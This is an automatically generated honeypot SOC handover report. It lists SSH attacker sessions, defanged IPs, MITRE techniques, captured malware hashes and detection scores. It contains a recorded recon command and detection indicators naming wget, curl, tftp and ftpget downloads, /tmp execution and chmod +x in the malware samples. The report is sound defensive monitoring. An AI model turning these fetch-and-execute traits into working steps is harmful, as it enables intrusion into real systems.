| `2026-08-15 02:52:40` | `cowrie.login.success` |
| `2026-08-15 02:52:41` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.59[.]63` to AbuseIPDB if not already reported
- [ ] Block `106.89.59[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f681ce56ecd3

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-08-15 02:52 |
| **Last Seen** | 2026-08-15 02:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:52:48` | `cowrie.session.connect` |
| `2026-08-15 02:52:49` | `cowrie.client.version` |
| `2026-08-15 02:52:49` | `cowrie.client.kex` |
| `2026-08-15 02:52:50` | `cowrie.login.success` |
| `2026-08-15 02:52:51` | `cowrie.direct-tcpip.request` |
| `2026-08-15 02:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f053155e468

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 02:54 |
| **Last Seen** | 2026-08-15 02:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:54:24` | `cowrie.session.connect` |
| `2026-08-15 02:54:24` | `cowrie.client.version` |
| `2026-08-15 02:54:24` | `cowrie.client.kex` |
| `2026-08-15 02:54:25` | `cowrie.login.success` |
| `2026-08-15 02:54:26` | `cowrie.session.params` |
| `2026-08-15 02:54:26` | `cowrie.command.input` |
| `2026-08-15 02:54:26` | `cowrie.log.closed` |
| `2026-08-15 02:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **154** | 2026-08-15 01:01 | 2026-08-15 02:54 | 177m | 0 | `T1592` | 🟠 MEDIUM |
| `34.14.77[.]4` | **30** | 2026-08-15 02:07 | 2026-08-15 02:08 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `34.79.100[.]31` | **30** | 2026-08-15 02:22 | 2026-08-15 02:22 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.114[.]244` | **20** | 2026-08-15 01:16 | 2026-08-15 02:52 | 40m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **8** | 2026-08-15 01:21 | 2026-08-15 02:45 | 6m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]165` | **5** | 2026-08-15 01:52 | 2026-08-15 01:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-15 01:14 | 2026-08-15 02:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **3** | 2026-08-15 01:15 | 2026-08-15 02:52 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-15 01:44 | 2026-08-15 01:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-08-15 02:12 | 2026-08-15 02:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]110` | **3** | 2026-08-15 01:52 | 2026-08-15 01:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]89` | **3** | 2026-08-15 01:53 | 2026-08-15 01:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.152.99[.]77` | **3** | 2026-08-15 01:52 | 2026-08-15 01:56 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-15 01:22 | 2026-08-15 02:22 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `172.236.228[.]38` | **2** | 2026-08-15 01:12 | 2026-08-15 01:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `200.74.41[.]104` | **2** | 2026-08-15 02:42 | 2026-08-15 02:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `50.29.180[.]204` | **2** | 2026-08-15 02:25 | 2026-08-15 02:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `114.80.32[.]225` | 1 | 2026-08-15 01:42 | 2026-08-15 01:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.98.63[.]18` | 1 | 2026-08-15 01:30 | 2026-08-15 01:32 | 94s | 0 | `T1592` | 🟢 LOW |
| `169.58.161[.]169` | 1 | 2026-08-15 01:33 | 2026-08-15 01:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.0.61[.]213` | 1 | 2026-08-15 01:58 | 2026-08-15 01:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `176.124.18[.]51` | 1 | 2026-08-15 02:44 | 2026-08-15 02:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.210.206[.]32` | 1 | 2026-08-15 01:21 | 2026-08-15 01:21 | 6s | 0 | `T1592` | 🟢 LOW |
| `193.176.29[.]22` | 1 | 2026-08-15 01:45 | 2026-08-15 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | 1 | 2026-08-15 02:21 | 2026-08-15 02:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-15 02:36 | 2026-08-15 02:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-08-15 01:35 | 2026-08-15 01:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]108` | 1 | 2026-08-15 01:42 | 2026-08-15 01:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]66` | 1 | 2026-08-15 01:42 | 2026-08-15 01:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-08-15 01:52 | 2026-08-15 01:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-08-15 01:03 | 2026-08-15 01:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]163` | 1 | 2026-08-15 01:30 | 2026-08-15 01:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]178` | 1 | 2026-08-15 01:45 | 2026-08-15 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.42[.]34` | 1 | 2026-08-15 01:15 | 2026-08-15 01:16 | 8s | 0 | `T1592` | 🟢 LOW |
| `98.88.249[.]38` | 1 | 2026-08-15 01:16 | 2026-08-15 01:16 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `8.152.99[.]77` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 20 |
| `60.174.39[.]82` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `49.124.151[.]21` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 47 |
| `178.178.222[.]50` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 15 |
| `66.132.224[.]89` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `65.20.191[.]231` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `211.23.109[.]116` | TW | Data Communication Business Group, | **100** ⚠️ | 50 |
| `27.223.98[.]117` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 156 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 130 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 30 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 30 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 29 |

---

## 🔕 False Positive Summary (54 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 14 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 44 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 479 cases |
| Tool 34  | Credential Extractor        | ✅ 147 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 92 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 54 filtered (11.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 61 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 130 priority case(s) shown individually · 35 recon entry/entries in table (17 group(s) consolidating 277 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-15T04:36:34Z_
